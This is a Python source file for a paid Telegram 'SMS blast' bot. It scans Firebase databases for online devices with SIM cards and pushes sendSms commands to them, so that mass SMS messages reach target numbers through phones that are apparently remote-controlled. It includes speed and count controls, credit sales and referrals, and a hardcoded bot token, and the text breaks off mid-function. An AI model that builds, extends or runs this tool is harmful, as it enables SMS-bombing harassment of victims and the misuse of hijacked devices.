"""
═══════════════════════════════════════════════════════════════
  SMS BLAST BOT — PREMIUM v3
  Owner: @Sakira540
  Framework: aiogram 3.x
  Features: Firebase scanner, credits, referral, redeem,
            force join, ban system, broadcast, pricing,
            video manager, protected numbers, tracking
═══════════════════════════════════════════════════════════════
"""

import asyncio
import json
import os
import time
import logging
import random
import string
import threading
import hashlib
from datetime import datetime, timedelta
from copy import deepcopy
from collections import defaultdict, OrderedDict

import aiohttp
from aiogram import Bot, Dispatcher, F, Router
from aiogram.types import (
    Message, CallbackQuery,
    InlineKeyboardMarkup, InlineKeyboardButton,
    ReplyKeyboardMarkup, KeyboardButton,
    ChatMemberUpdated, FSInputFile, BotCommand,
    BotCommandScopeDefault, BotCommandScopeChat,
)
from aiogram.filters import Command, CommandStart, CommandObject
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.exceptions import TelegramBadRequest, TelegramForbiddenError

# ═══════════════════════════════════════════════════════════════
#                        LOGGING SETUP
# ═══════════════════════════════════════════════════════════════

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s — %(message)s",
    datefmt="%H:%M:%S"
)
log = logging.getLogger("BlastBot")

# ═══════════════════════════════════════════════════════════════
#                     PREMIUM EMOJI IDs
# ═══════════════════════════════════════════════════════════════

EMOJI_FIRE = "5289722755871162900"
EMOJI_STAR = "5372849966689566579"
EMOJI_ROCKET = "5359664288241829619"
EMOJI_CROWN = "6237927637906364256"
EMOJI_SHIELD = "6235476345451716705"
EMOJI_MONEY = "6244678063775289843"
EMOJI_PHONE = "6239930832128056797"
EMOJI_CHECK = "4958689671950369798"
EMOJI_CROSS = "4958900559139570572"
EMOJI_WARNING = "4958526153955476488"
EMOJI_LOCK = "4956719506027185156"
EMOJI_GIFT = "5084613633418199991"
EMOJI_BELL = "5098265504796115765"
EMOJI_GEAR = "5116414868357907335"
EMOJI_VIDEO = "5372849966689566579"

FIRE_EFFECT_ID = "5104841245755180586"

# ═══════════════════════════════════════════════════════════════
#                      SMALL CAPS MAP
# ═══════════════════════════════════════════════════════════════

SMALL_CAPS_MAP = str.maketrans(
    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
    "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ0123456789"
)

def sc(text: str) -> str:
    """Convert to small caps"""
    return text.translate(SMALL_CAPS_MAP)

def em(emoji_id: str, fallback: str = "⭐") -> str:
    """Premium emoji helper"""
    if emoji_id:
        return f'<tg-emoji emoji-id="{emoji_id}">{fallback}</tg-emoji>'
    return fallback

# ═══════════════════════════════════════════════════════════════
#                     BUTTON BUILDERS
# ═══════════════════════════════════════════════════════════════

def btn(text: str, cb: str, emoji_id: str = None, fb: str = "") -> InlineKeyboardButton:
    lbl = f"{fb} {sc(text)}".strip() if (fb and not emoji_id) else sc(text)
    if emoji_id:
        return InlineKeyboardButton(
            text=lbl, callback_data=cb, icon_custom_emoji_id=emoji_id
        )
    return InlineKeyboardButton(text=lbl, callback_data=cb)

def btn_url(text: str, url: str, emoji_id: str = None, fb: str = "") -> InlineKeyboardButton:
    lbl = f"{fb} {sc(text)}".strip() if (fb and not emoji_id) else sc(text)
    if emoji_id:
        return InlineKeyboardButton(
            text=lbl, url=url, icon_custom_emoji_id=emoji_id
        )
    return InlineKeyboardButton(text=lbl, url=url)

def sbtn(text: str, style: str = "primary", contact: bool = False, loc: bool = False) -> KeyboardButton:
    b = KeyboardButton(text=text, request_contact=contact, request_location=loc)
    try:
        setattr(b, "style", style)
    except:
        pass
    return b

def main_menu() -> ReplyKeyboardMarkup:
    return ReplyKeyboardMarkup(
        keyboard=[
            [sbtn("🚀 Start Blast", "success"), sbtn("📹 Videos", "primary")],
            [sbtn("💰 Credits", "primary"), sbtn("🎁 Refer", "primary")],
            [sbtn("🛑 Stop Blast", "danger"), sbtn("⚙️ Help", "primary")],
        ],
        resize_keyboard=True,
    )

def owner_menu() -> ReplyKeyboardMarkup:
    return ReplyKeyboardMarkup(
        keyboard=[
            [sbtn("👑 Owner Panel", "success"), sbtn("🚀 Send Blast", "primary")],
            [sbtn("🔥 Firebase", "primary"), sbtn("📢 Broadcast", "primary")],
            [sbtn("📊 Stats", "primary"), sbtn("🛑 Stop Blast", "danger")],
        ],
        resize_keyboard=True,
    )

# ═══════════════════════════════════════════════════════════════
#                      CONFIGURATION
# ═══════════════════════════════════════════════════════════════

MAIN_OWNER = 8241730977
SUPER_ADMIN_NAME = "@Sakira540"
SUPER_ADMIN_LINK = "https://t.me/+2irJsQDVbphiNzI1"
SUPER_ADMINS = [8241730977]

BOT_TOKEN = os.getenv("BOT_TOKEN", "9273864914:AAGSMztMHacgkv_nhGhBNwo9EYzmnDxE_fQ")
LOG_CHANNEL_ID = int(os.getenv("LOG_CHANNEL_ID", "-1004437456868"))

_DATA_FILE = "blast_bdata.json"
_VERSION = "v3-PREMIUM"
_PROGRESS_UPDATE_INTERVAL = 1.0
_SEND_DELAY = 0.3
_BACKGROUND_SCAN_INTERVAL = 60.0

SPEED_FAST = 0.05
SPEED_MEDIUM = 0.2
SPEED_SLOW = 0.5
SPEED_DEFAULT = SPEED_MEDIUM

_FILE_LOCK = threading.Lock()

# ═══════════════════════════════════════════════════════════════
#                    TELEGRAM EFFECTS
# ═══════════════════════════════════════════════════════════════

async def send_fire_effect_private(bot: Bot, chat_id: int):
    try:
        async with aiohttp.ClientSession() as s:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            payload = {
                "chat_id": chat_id,
                "text": "🔥",
                "message_effect_id": FIRE_EFFECT_ID,
            }
            async with s.post(url, json=payload, timeout=5) as r:
                res = await r.json()
                if res.get("ok"):
                    mid = res["result"]["message_id"]
                    await asyncio.sleep(2)
                    del_url = f"https://api.telegram.org/bot{BOT_TOKEN}/deleteMessage"
                    await s.post(del_url, json={"chat_id": chat_id, "message_id": mid})
    except Exception as e:
        log.warning(f"Fire effect: {e}")

async def send_channel_log(bot: Bot, text: str):
    try:
        await bot.send_message(LOG_CHANNEL_ID, text, parse_mode="HTML")
    except Exception as e:
        log.error(f"Channel log: {e}")

# ═══════════════════════════════════════════════════════════════
#                    SESSION MANAGEMENT
# ═══════════════════════════════════════════════════════════════

class UserSession:
    __slots__ = [
        'uid', 'cancelled', 'sent', 'failed', 'task',
        'start_time', 'lock', 'number', 'target_uid'
    ]

    def __init__(self, uid: int):
        self.uid = uid
        self.cancelled = False
        self.sent = 0
        self.failed = 0
        self.task = None
        self.start_time = time.time()
        self.lock = asyncio.Lock()
        self.number = None
        self.target_uid = None

USER_SESSIONS: dict = {}
SESSIONS_LOCK = asyncio.Lock()

# ═══════════════════════════════════════════════════════════════
#                    GLOBAL STATE
# ═══════════════════════════════════════════════════════════════

CACHED_DEVICES: list = []
LAST_SCAN_TIME: float = 0
SCANNING_IN_PROGRESS: bool = False
SCAN_STATUS: str = f"{em(EMOJI_WARNING, '⏳')} ɴᴏᴛ sᴛᴀʀᴛᴇᴅ"
DEVICE_HEALTH_LOG: list = []
FB_DEVICE_COUNTS: dict = {}
SCAN_LOCK = asyncio.Lock()
PROTECTED_NUMBERS: dict = {}

# ═══════════════════════════════════════════════════════════════
#                    FSM STATES
# ═══════════════════════════════════════════════════════════════

class S(StatesGroup):
    # User flows
    send_number = State()
    send_message = State()
    send_speed = State()
    send_count = State()
    # Owner flows
    owner_send_number = State()
    owner_send_message = State()
    owner_send_speed = State()
    owner_send_count = State()
    # Admin flows
    admin_send_number = State()
    admin_send_message = State()
    admin_send_speed = State()
    admin_send_count = State()
    # Redeem
    redeem_code = State()
    # Firebase
    add_firebase = State()
    add_firebase_file = State()
    # Management
    add_owner = State()
    add_admin = State()
    ban_user = State()
    unban_user = State()
    broadcast = State()
    # Force join
    fj_add_channel = State()
    fj_add_link = State()
    # Pricing plans
    add_plan_name = State()
    add_plan_price = State()
    add_plan_credits = State()
    add_plan_link = State()
    # Credits
    add_credits_uid = State()
    add_credits_amount = State()
    deduct_credits_uid = State()
    deduct_credits_amount = State()
    # Redeem gen
    gen_redeem_credits = State()
    gen_redeem_uses = State()
    # Settings
    set_ref_credits = State()
    # Protect
    protect_number = State()
    track_number = State()
    # Transfer
    transfer_credits_uid = State()
    transfer_credits_amount = State()
    # Bulk credits
    add_all_credits_amount = State()
    deduct_all_credits_amount = State()
    # Videos
    add_video = State()

# ═══════════════════════════════════════════════════════════════
#                    DATA LAYER
# ═══════════════════════════════════════════════════════════════

def _default_data() -> dict:
    return {
        "owners": [MAIN_OWNER],
        "admins": [],
        "banned": [],
        "free_mode": False,
        "approved": [],
        "firebases": [],
        "users": {},
        "stats": {"total_sent": 0, "total_failed": 0, "api_usage": {}},
        "premium": {"ref_credits": 3},
        "force_join": {"enabled": False, "channels": []},
        "pricing": {"plans": []},
        "redeem_codes": {},
        "settings": {"ref_credits": 3, "max_owners": 6},
        "sms_history": {},
        "activity_log": [],
        "protected_numbers": {},
        "videos": [],
    }

def load() -> dict:
    with _FILE_LOCK:
        if os.path.exists(_DATA_FILE):
            try:
                with open(_DATA_FILE, "r", encoding="utf-8") as f:
                    data = json.load(f)
                default = _default_data()
                for k, v in default.items():
                    if k not in data:
                        data[k] = v
                if MAIN_OWNER not in data.get("owners", []):
                    data["owners"].insert(0, MAIN_OWNER)
                for u in data.get("users", {}).values():
                    u.setdefault("credits", 0)
                    u.setdefault("sms_history", [])
                return data
            except Exception as e:
                log.error(f"Load error: {e}")
        d = _default_data()
        save(d)
        return d

def save(d: dict):
    with _FILE_LOCK:
        try:
            tmp = _DATA_FILE + ".tmp"
            with open(tmp, "w", encoding="utf-8") as f:
                json.dump(d, f, indent=2, ensure_ascii=False)
            os.replace(tmp, _DATA_FILE)
        except Exception as e:
            log.error(f"Save error: {e}")

def reg_user(uid: int, name: str, d: dict) -> bool:
    k = str(uid)
    if k not in d["users"]:
        d["users"][k] = {
            "name": name,
            "uses": 0,
            "credits": 0,
            "joined_at": int(time.time()),
            "refer_code": None,
            "referred_by": None,
            "sms_history": [],
        }
        return True
    return False

def log_activity(d: dict, action: str, uid: int, details: str = ""):
    d.setdefault("activity_log", []).append({
        "timestamp": int(time.time()),
        "uid": uid,
        "action": action,
        "details": details,
    })
    if len(d["activity_log"]) > 1000:
        d["activity_log"] = d["activity_log"][-1000:]

# ═══════════════════════════════════════════════════════════════
#                    ROLE HELPERS
# ═══════════════════════════════════════════════════════════════

def is_main_owner(uid: int) -> bool:
    return uid == MAIN_OWNER

def is_owner(uid: int, d: dict) -> bool:
    return uid in d.get("owners", [MAIN_OWNER]) or uid in SUPER_ADMINS

def is_admin(uid: int, d: dict) -> bool:
    return is_owner(uid, d) or uid in d.get("admins", [])

def is_banned(uid: int, d: dict) -> bool:
    return uid in d.get("banned", [])

def can_use(uid: int, d: dict) -> bool:
    if is_banned(uid, d):
        return False
    if is_admin(uid, d):
        return True
    if d.get("free_mode"):
        return True
    return uid in d.get("approved", [])

def role_tag(uid: int, d: dict) -> str:
    if is_main_owner(uid):
        return f"{em(EMOJI_CROWN, '👑')} ᴍᴀɪɴ ᴏᴡɴᴇʀ"
    if is_owner(uid, d):
        return f"{em(EMOJI_CROWN, '🔱')} ᴏᴡɴᴇʀ"
    if uid in d.get("admins", []):
        return f"{em(EMOJI_SHIELD, '🛡')} ᴀᴅᴍɪɴ"
    if uid in d.get("approved", []):
        return f"{em(EMOJI_CHECK, '✅')} ᴀᴘᴘʀᴏᴠᴇᴅ"
    if d.get("free_mode"):
        return f"{em(EMOJI_GIFT, '🆓')} ғʀᴇᴇ ᴜsᴇʀ"
    return f"{em(EMOJI_CROSS, '❌')} ɴᴏ ᴀᴄᴄᴇss"

# ═══════════════════════════════════════════════════════════════
#                    CREDITS HELPERS
# ═══════════════════════════════════════════════════════════════

def get_credits(uid: int, d: dict) -> int:
    return d.get("users", {}).get(str(uid), {}).get("credits", 0)

def add_credits(uid: int, amt: int, d: dict):
    k = str(uid)
    if k not in d.setdefault("users", {}):
        d["users"][k] = {"credits": 0}
    d["users"][k]["credits"] = d["users"][k].get("credits", 0) + amt

def deduct_credits(uid: int, amt: int, d: dict) -> bool:
    k = str(uid)
    if k in d.get("users", {}) and d["users"][k].get("credits", 0) >= amt:
        d["users"][k]["credits"] -= amt
        return True
    return False

def gen_refer_code(uid: int, d: dict) -> str:
    k = str(uid)
    if k in d.get("users", {}) and d["users"][k].get("refer_code"):
        return d["users"][k]["refer_code"]
    while True:
        code = "REF" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
        if not any(u.get("refer_code") == code for u in d.get("users", {}).values()):
            break
    if k in d.get("users", {}):
        d["users"][k]["refer_code"] = code
    return code

def process_referral(new_uid: int, code: str, d: dict):
    ref = None
    for uid_str, u in d.get("users", {}).items():
        if u.get("refer_code") == code:
            ref = int(uid_str)
            break
    if not ref:
        return False, f"{em(EMOJI_CROSS, '❌')} ɪɴᴠᴀʟɪᴅ ᴄᴏᴅᴇ!", None
    if ref == new_uid:
        return False, f"{em(EMOJI_CROSS, '❌')} ᴀᴘɴᴀ ᴄᴏᴅᴇ ɴᴀʜɪ!", None
    if d["users"].get(str(new_uid), {}).get("referred_by"):
        return False, f"{em(EMOJI_CROSS, '❌')} ᴀᴀᴘ ᴘᴇʜʟᴇ sᴇ ʀᴇғᴇʀ ʜᴀɪ!", None
    rc = d.get("settings", {}).get("ref_credits", 3)
    add_credits(new_uid, rc, d)
    add_credits(ref, rc, d)
    d["users"][str(new_uid)]["referred_by"] = ref
    return True, f"{em(EMOJI_GIFT, '🎉')} +{rc} ᴄʀᴇᴅɪᴛs!", ref

# ═══════════════════════════════════════════════════════════════
#                    UTILITY HELPERS
# ═══════════════════════════════════════════════════════════════

async def send_random_video(bot: Bot, chat_id: int, caption: str = ""):
    d = load()
    vids = d.get("videos", [])
    if vids:
        try:
            await bot.send_video(
                chat_id, video=random.choice(vids),
                caption=caption, parse_mode="HTML"
            )
        except Exception as e:
            log.error(f"Video: {e}")

def kb(*rows) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=t, callback_data=c) for t, c in row]
        for row in rows
    ])

def speed_kb(prefix: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            btn("ғᴀsᴛ", f"{prefix}:speed:fast", EMOJI_ROCKET, "🚀"),
            btn("ᴍᴇᴅɪᴜᴍ", f"{prefix}:speed:medium", EMOJI_STAR, "⚡"),
            btn("sʟᴏᴡ", f"{prefix}:speed:slow", EMOJI_PHONE, "🐢"),
        ],
        [btn("ᴄᴀɴᴄᴇʟ", f"{prefix}:home", EMOJI_CROSS, "❌")],
    ])

def progress_bar(cur: int, tot: int, w: int = 20) -> str:
    if tot <= 0:
        return "░" * w
    f = min(w, int(w * cur / tot))
    return "█" * f + "░" * (w - f)

def progress_text(sent: int, failed: int, total: int, credits=None, speed_label="⚡ MEDIUM") -> str:
    bar = progress_bar(sent + failed, total)
    pct = int(((sent + failed) / total) * 100) if total else 0
    txt = (
        f"{em(EMOJI_WARNING, '⏳')} <b>{sc('sending sms...')}</b>\n\n"
        f"{bar} <b>{pct}%</b>\n\n"
        f"{em(EMOJI_CHECK, '✅')} sᴇɴᴛ: <b>{sent}</b>\n"
        f"{em(EMOJI_CROSS, '❌')} ғᴀɪʟᴇᴅ: <b>{failed}</b>\n"
        f"{em(EMOJI_STAR, '📊')} ᴘʀᴏɢʀᴇss: <b>{sent + failed}</b> / <b>{total}</b>\n"
        f"{em(EMOJI_ROCKET, '⚡')} sᴘᴇᴇᴅ: <b>{speed_label}</b>\n"
    )
    if credits is not None:
        txt += f"\n{em(EMOJI_MONEY, '💳')} ᴄʀᴇᴅɪᴛs: <b>{credits}</b>"
    txt += f"\n\n<i>{em(EMOJI_WARNING, '🛑')} sᴛᴏᴘ ʙᴜᴛᴛᴏɴ ᴅᴀʙᴀʏᴇɪɴ.</i>"
    return txt

def stop_send_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("sᴛᴏᴘ sᴇɴᴅɪɴɢ", "user:stop_send", EMOJI_CROSS, "🛑")]
    ])

def mask_number(n: str) -> str:
    if len(n) <= 4:
        return n
    return n[:2] + "******" + n[-4:]

def fmt_time(ts: int) -> str:
    return datetime.fromtimestamp(ts).strftime("%d/%m/%Y %H:%M")

def fmt_duration(s: int) -> str:
    if s < 60:
        return f"{s}s"
    if s < 3600:
        return f"{s // 60}m {s % 60}s"
    return f"{s // 3600}h {(s % 3600) // 60}m"

# ═══════════════════════════════════════════════════════════════
#                    SCANNER STATUS
# ═══════════════════════════════════════════════════════════════

def get_scan_status() -> str:
    if SCANNING_IN_PROGRESS:
        return f"{em(EMOJI_WARNING, '⏳')} sᴄᴀɴɴɪɴɢ..."
    if not CACHED_DEVICES:
        return f"{em(EMOJI_CROSS, '🔴')} ɴᴏ ᴅᴇᴠɪᴄᴇs"
    cnt = len(CACHED_DEVICES)
    diff = time.time() - LAST_SCAN_TIME
    if diff < 60:
        return f"{em(EMOJI_CHECK, '🟢')} {cnt} ᴅᴇᴠɪᴄᴇs"
    if diff < 300:
        return f"{em(EMOJI_WARNING, '🟡')} {cnt} ᴅᴇᴠɪᴄᴇs ({int(diff / 60)}ᴍ)"
    return f"{em(EMOJI_CROSS, '🔴')} {cnt} ᴅᴇᴠɪᴄᴇs ({int(diff / 60)}ᴍ)"

# ═══════════════════════════════════════════════════════════════
#                    BACKGROUND SCANNER
# ═══════════════════════════════════════════════════════════════

async def background_firebase_scanner(bot: Bot):
    global CACHED_DEVICES, LAST_SCAN_TIME, SCANNING_IN_PROGRESS
    global SCAN_STATUS, DEVICE_HEALTH_LOG

    log.info("Background Firebase Scanner STARTED")
    first_scan = False

    while True:
        async with SCAN_LOCK:
            if SCANNING_IN_PROGRESS:
                await asyncio.sleep(5)
                continue
            SCANNING_IN_PROGRESS = True

        SCAN_STATUS = f"{em(EMOJI_WARNING, '🔍')} sᴄᴀɴɴɪɴɢ..."
        t0 = time.time()

        try:
            d = load()
            fbs = d.get("firebases", [])

            if not fbs:
                SCAN_STATUS = f"{em(EMOJI_WARNING, '⚠️')} ɴᴏ ғɪʀᴇʙᴀsᴇ ᴄᴏɴғɪɢᴜʀᴇᴅ"
                CACHED_DEVICES = []
            else:
                devices = await get_all_online_devices(d)
                dur = time.time() - t0
                CACHED_DEVICES = devices

                for fb in fbs:
                    cnt = sum(1 for dv in devices if dv["fb_id"] == fb["id"])
                    FB_DEVICE_COUNTS[fb["id"]] = {
                        "label": fb.get("label", fb["url"][:30]),
                        "online": cnt,
                        "last_update": int(time.time()),
                    }
                LAST_SCAN_TIME = time.time()

                DEVICE_HEALTH_LOG.append({
                    "timestamp": int(time.time()),
                    "devices": len(devices),
                    "dbs": len(fbs),
                    "duration": round(dur, 2),
                    "status": "ok" if devices else "none",
                })
                if len(DEVICE_HEALTH_LOG) > 100:
                    DEVICE_HEALTH_LOG = DEVICE_HEALTH_LOG[-100:]

                if devices:
                    SCAN_STATUS = (
                        f"{em(EMOJI_CHECK, '🟢')} {len(devices)} ᴅᴇᴠɪᴄᴇs | "
                        f"{fmt_time(int(time.time()))}"
                    )
                    if not first_scan:
                        try:
                            await bot.send_message(
                                MAIN_OWNER,
                                f"{em(EMOJI_ROCKET, '🚀')} <b>sᴄᴀɴɴᴇʀ ᴀᴄᴛɪᴠᴇ!</b>\n\n"
                                f"{em(EMOJI_PHONE, '📱')} ᴅᴇᴠɪᴄᴇs: <b>{len(devices)}</b>\n"
                                f"{em(EMOJI_FIRE, '🔥')} ᴅʙs: <b>{len(fbs)}</b>\n"
                                f"{em(EMOJI_GEAR, '🔄')} ᴀᴜᴛᴏ: <b>1ᴍ</b>\n"
                                f"{em(EMOJI_WARNING, '⏱')} ᴛɪᴍᴇ: <b>{dur:.1f}s</b>",
                                parse_mode="HTML",
                            )
                        except:
                            pass
                        first_scan = True
                else:
                    SCAN_STATUS = (
                        f"{em(EMOJI_CROSS, '🔴')} ɴᴏ ᴅᴇᴠɪᴄᴇs | "
                        f"{fmt_time(int(time.time()))}"
                    )

        except Exception as e:
            SCAN_STATUS = f"{em(EMOJI_CROSS, '❌')} ᴇʀʀᴏʀ"
            log.error(f"Scan: {e}")
        finally:
            async with SCAN_LOCK:
                SCANNING_IN_PROGRESS = False

        await asyncio.sleep(_BACKGROUND_SCAN_INTERVAL)

def get_cached_devices() -> list:
    return CACHED_DEVICES

# ═══════════════════════════════════════════════════════════════
#                    FIREBASE OPERATIONS
# ═══════════════════════════════════════════════════════════════

async def fb_get(base_url: str, path: str) -> dict:
    try:
        async with aiohttp.ClientSession() as s:
            url = base_url.rstrip("/") + path
            async with s.get(url, timeout=aiohttp.ClientTimeout(total=8)) as r:
                if r.status == 200:
                    t = (await r.text()).strip()
                    if t == "null" or not t:
                        return {}
                    return json.loads(t)
    except Exception as e:
        log.warning(f"fb_get: {e}")
    return {}

async def fb_put(base_url: str, path: str, payload: dict) -> bool:
    url = base_url.rstrip("/") + path
    for i in range(3):
        try:
            async with aiohttp.ClientSession() as s:
                async with s.put(url, json=payload, timeout=aiohttp.ClientTimeout(total=6)) as r:
                    if 200 <= r.status < 300:
                        return True
        except Exception as e:
            log.warning(f"fb_put try {i + 1}: {e}")
        await asyncio.sleep(0.5 * (i + 1))
    return False

def device_is_online(dd: dict) -> bool:
    return any([
        dd.get("isOnline"),
        dd.get("online"),
        dd.get("connected"),
        dd.get("status") in ("online", "active", True, 1),
    ])

async def get_all_online_devices(d: dict) -> list:
    fbs = d.get("firebases", [])
    if not fbs:
        return []
    results = []
    current_ids = {fb["id"] for fb in fbs}
    global CACHED_DEVICES
    CACHED_DEVICES = [dv for dv in CACHED_DEVICES if dv.get("fb_id") in current_ids]
    sem = asyncio.Semaphore(15)

    async def fetch_one(fb: dict):
        try:
            url = fb["url"].rstrip("/") + "/clients.json?shallow=true"
            async with aiohttp.ClientSession() as s:
                async with s.get(url, timeout=aiohttp.ClientTimeout(total=10)) as r:
                    if r.status != 200:
                        return
                    t = (await r.text()).strip()
                    if t == "null" or not t:
                        return
                    dids = json.loads(t)
                    if not isinstance(dids, dict):
                        return

                    async def fetch_dev(dev_id: str):
                        try:
                            async with sem:
                                u = fb["url"].rstrip("/") + f"/clients/{dev_id}.json"
                                async with s.get(u, timeout=aiohttp.ClientTimeout(total=8)) as r2:
                                    if r2.status == 200:
                                        t2 = (await r2.text()).strip()
                                        if t2 == "null" or not t2:
                                            return None
                                        dd = json.loads(t2)
                                        if isinstance(dd, dict) and device_is_online(dd):
                                            name = (
                                                dd.get("deviceName")
                                                or dd.get("name")
                                                or dev_id[:16]
                                            )
                                            return {
                                                "fb_id": fb["id"],
                                                "fb_url": fb["url"],
                                                "fb_label": fb.get("label", fb["url"][:30]),
                                                "dev_id": dev_id,
                                                "dev_name": name,
                                                "sims": dd.get("sims", []),
                                            }
                        except Exception as e:
                            log.warning(f"dev: {e}")
                        return None

                    ids = list(dids.keys())
                    for i in range(0, len(ids), 20):
                        batch = ids[i : i + 20]
                        tasks = [fetch_dev(x) for x in batch]
                        for res in await asyncio.gather(*tasks):
                            if res:
                                results.append(res)
        except Exception as e:
            log.warning(f"fb: {e}")

    await asyncio.gather(*(fetch_one(fb) for fb in fbs))
    return results

async def send_sms_via_device(fb_url: str, dev_id: str, sim: int, to: str, msg: str) -> bool:
    return await fb_put(
        fb_url,
        f"/clients/{dev_id}/webhookEvent/sendSms.json",
        {
            "from": sim,
            "to": to.strip(),
            "message": msg.strip(),
            "isSended": False,
            "timestamp": int(time.time()),
        },
    )

# ═══════════════════════════════════════════════════════════════
#                    FORCE JOIN HELPERS
# ═══════════════════════════════════════════════════════════════

async def check_membership(bot: Bot, uid: int, ch_id: str) -> bool:
    try:
        cid = str(ch_id).strip()
        chat_id = int(cid) if cid.lstrip("-").isdigit() else cid
        m = await bot.get_chat_member(chat_id, uid)
        return m.status in ("member", "administrator", "creator")
    except Exception as e:
        log.error(f"FJ check {ch_id}: {e}")
        return False

async def user_joined_all(bot: Bot, uid: int, d: dict):
    if is_owner(uid, d):
        return True, []
    fj = d.get("force_join", {})
    if not fj.get("enabled"):
        return True, []
    missing = []
    for ch in fj.get("channels", []):
        if ch.get("required", True) and not await check_membership(bot, uid, ch["id"]):
            missing.append(ch)
    return len(missing) == 0, missing

def force_join_text(missing: list) -> str:
    lines = [
        f"{em(EMOJI_CROSS, '⛔')} <b>{sc('bot use karne ke liye pehle join karein!')}</b>\n",
        f"{em(EMOJI_BELL, '👇')} ɴɪᴄʜᴇ ᴊᴏɪɴ ᴋᴀʀᴇɪɴ:",
    ]
    for ch in missing:
        lines.append(f"\n• <a href='{ch['link']}'>{ch.get('title', 'Channel')}</a>")
    lines.append(f"\n\n<i>{sc('join ke baad refresh dabayein.')}</i>")
    return "\n".join(lines)

def force_join_kb(missing: list) -> InlineKeyboardMarkup:
    rows = [
        [btn_url(f"ᴊᴏɪɴ {ch.get('title', 'Channel')}", ch["link"], EMOJI_BELL, "🔔")]
        for ch in missing
    ]
    rows.append([btn("ʀᴇғʀᴇsʜ", "fj:check", EMOJI_GEAR, "🔄")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

# ═══════════════════════════════════════════════════════════════
#                    PANEL TEXT BUILDERS
# ═══════════════════════════════════════════════════════════════

def owner_panel_text(d: dict) -> str:
    fbs = d.get("firebases", [])
    users = d.get("users", {})
    stats = d.get("stats", {})
    mode = (
        f"{em(EMOJI_CHECK, '🟢')} ғʀᴇᴇ"
        if d.get("free_mode")
        else f"{em(EMOJI_CROSS, '🔴')} ᴀᴘᴘʀᴏᴠᴀʟ"
    )
    fj = d.get("force_join", {})
    fj_st = f"{em(EMOJI_CHECK, '🟢')} ᴏɴ" if fj.get("enabled") else f"{em(EMOJI_CROSS, '🔴')} ᴏғғ"
    active = len([s for s in USER_SESSIONS.values() if s.task and not s.task.done()])

    fb_lines = []
    for fb_id, fd in FB_DEVICE_COUNTS.items():
        age = int(time.time() - fd.get("last_update", 0))
        st = (
            em(EMOJI_CHECK, "🟢")
            if age < 60
            else em(EMOJI_WARNING, "🟡")
            if age < 300
            else em(EMOJI_CROSS, "🔴")
        )
        fb_lines.append(f"  {st} {fd['label'][:20]}: {fd['online']} ᴏɴʟɪɴᴇ")
    fb_sum = (
        "\n".join(fb_lines)
        if fb_lines
        else f"  {em(EMOJI_WARNING, '😴')} ɴᴏ ᴅᴀᴛᴀ"
    )

    return (
        f"{em(EMOJI_CROWN, '👑')} <b>{sc('owner panel')}</b> — {_VERSION}\n"
        f"<b>Owner:</b> {SUPER_ADMIN_NAME}\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{em(EMOJI_FIRE, '🔥')} ғɪʀᴇʙᴀsᴇs   : <b>{len(fbs)}</b>\n"
        f"{em(EMOJI_CROWN, '👑')} sᴜᴘᴇʀ ᴀᴅᴍs   : <b>{len(d.get('owners', []))}</b>\n"
        f"{em(EMOJI_SHIELD, '🛡')} ᴀᴅᴍɪɴs       : <b>{len(d.get('admins', []))}</b>\n"
        f"{em(EMOJI_STAR, '👥')} ᴜsᴇʀs        : <b>{len(users)}</b>\n"
        f"{em(EMOJI_VIDEO, '📹')} ᴠɪᴅᴇᴏs       : <b>{len(d.get('videos', []))}</b>\n"
        f"{em(EMOJI_CHECK, '📤')} ᴛᴏᴛᴀʟ sᴇɴᴛ   : <b>{stats.get('total_sent', 0)}</b>\n"
        f"{em(EMOJI_CROSS, '❌')} ᴛᴏᴛᴀʟ ғᴀɪʟᴇᴅ : <b>{stats.get('total_failed', 0)}</b>\n"
        f"{em(EMOJI_ROCKET, '🚀')} ᴀᴄᴛɪᴠᴇ sᴇɴᴅs : <b>{active}</b>\n"
        f"{em(EMOJI_GIFT, '🔓')} ᴀᴄᴄᴇss ᴍᴏᴅᴇ  : {mode}\n"
        f"{em(EMOJI_BELL, '📢')} ғᴏʀᴄᴇ ᴊᴏɪɴ   : {fj_st}\n"
        f"{em(EMOJI_MONEY, '💳')} ᴘʟᴀɴs        : <b>{len(d.get('pricing', {}).get('plans', []))}</b>\n"
        f"{em(EMOJI_LOCK, '🔒')} ᴘʀᴏᴛᴇᴄᴛᴇᴅ   : <b>{len(PROTECTED_NUMBERS)}</b>\n"
        f"{em(EMOJI_GEAR, '🔄')} sᴄᴀɴɴᴇʀ     : {get_scan_status()}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n{fb_sum}"
    )

def admin_panel_text(d: dict) -> str:
    users = d.get("users", {})
    stats = d.get("stats", {})
    mode = (
        f"{em(EMOJI_CHECK, '🟢')} ғʀᴇᴇ"
        if d.get("free_mode")
        else f"{em(EMOJI_CROSS, '🔴')} ᴀᴘᴘʀᴏᴠᴀʟ"
    )
    active = len([s for s in USER_SESSIONS.values() if s.task and not s.task.done()])

    fb_lines = []
    for fb_id, fd in FB_DEVICE_COUNTS.items():
        age = int(time.time() - fd.get("last_update", 0))
        st = (
            em(EMOJI_CHECK, "🟢")
            if age < 60
            else em(EMOJI_WARNING, "🟡")
            if age < 300
            else em(EMOJI_CROSS, "🔴")
        )
        fb_lines.append(f"  {st} {fd['label'][:20]}: {fd['online']} ᴏɴʟɪɴᴇ")
    fb_sum = (
        "\n".join(fb_lines)
        if fb_lines
        else f"  {em(EMOJI_WARNING, '😴')} ɴᴏ ᴅᴀᴛᴀ"
    )

    return (
